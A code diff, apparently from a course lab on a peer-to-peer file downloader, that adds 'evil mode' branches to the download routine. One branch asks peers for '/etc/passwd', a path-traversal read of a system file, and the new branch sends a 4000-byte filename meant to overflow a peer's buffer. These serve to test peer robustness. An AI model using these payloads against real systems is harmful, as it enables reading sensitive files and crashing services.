@@ -539,12 +539,22 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-
-	if(!(evil_mode == 3))
-	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
-	else //evil 3
+	  
+	if(evil_mode == 3)
 	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", "/etc/passwd");
-	
+	else if (evil_mode == 2){
+	  char* name = malloc(4000*sizeof(char*));
+	  int i = 0;
+	  for(i = 0; i < 3999; i++){
+	    name[i] = 'A';
+	  }
+	  name[3999] = '\0';
+
+	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", name);
+	  
+	} else
+	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
